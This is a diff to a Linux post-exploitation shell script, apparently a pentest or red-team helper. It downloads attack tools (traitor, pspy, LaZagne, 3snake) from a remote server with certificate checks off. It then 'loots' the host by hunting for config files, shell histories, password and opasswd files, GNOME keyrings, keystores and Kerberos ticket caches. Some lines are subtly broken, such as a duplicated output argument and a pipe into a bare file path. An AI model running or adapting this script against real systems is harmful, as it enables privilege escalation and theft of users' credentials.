@@ -82,12 +82,12 @@ download_tools() {
         then
             curl -s -k "$server_url/tools/traitor-amd64" -o pspy64 traitor-amd64
             curl -s -k "$server_url/tools/pspy64" -o pspy64
-            curl -s -k "$server_url/tools/lazagne" -o lazagne64
+            curl -s -k "$server_url/tools/lazagne64" -o lazagne64
             curl -s -k "$server_url/tools/3snake64" -o 3snake64
         else
             curl -s -k "$server_url/tools/traitor-386" -o traitor-386
             curl -s -k "$server_url/tools/pspy32" -o pspy32
-            curl -s -k "$server_url/tools/lazagne" -o lazagne32
+            curl -s -k "$server_url/tools/lazagne32" -o lazagne32
             curl -s -k "$server_url/tools/3snake32" -o 3snake32
         fi
     fi
@@ -113,15 +113,16 @@ looting() {
     echo "======================= DIRECTORY LISTERNING OF THE: /var/log" | tee -a loot/files_to_check.txt
     ls /var/log | tee -a loot/var_log_directory_list.txt
     echo "======================= CONFIG FILES (config.php):" | tee -a loot/files_to_check.txt
-    locate "/config." | tee -a loot/files_to_check.txt
+    find / -name "config.*" 2>/dev/null | tee -a loot/files_to_check.txt
     echo "======================= HISTORY FILES (.bash_history):" | tee -a loot/files_to_check.txt
     find / -name "*_history" -xdev 2>/dev/null | loot/files_to_check.txt
     echo "======================= PASSWORD FILES:" | tee -a loot/files_to_check.txt
-    locate password | tee -a loot/files_to_check.txt
+    find / -name "password" | tee -a loot/files_to_check.txt
     echo "======================= OLD PASSWORDS:" | tee -a loot/files_to_check.txt
-    find / -name opasswd -xdev 2>/dev/null | tee -a loot/files_to_check.txt
+    find / -name "opasswd" 2>/dev/null | tee -a loot/files_to_check.txt
     echo "======================= GNOME KEYRING - cracking:" | tee -a loot/files_to_check.txt
-    locate login.keyring; locate user.keystore | tee -a loot/files_to_check.txt
+    find / -name "login.keyring" | tee -a loot/files_to_check.txt
+    find / -name "user.keystore" | tee -a loot/files_to_check.txt
     echo "======================= KERBEROS - CACHE" | tee -a loot/kerberos.txt
     env | grep KRB5CCNAME | tee -a loot/kerberos.txt
     find / -name "krb5cc_*" 2>/dev/null
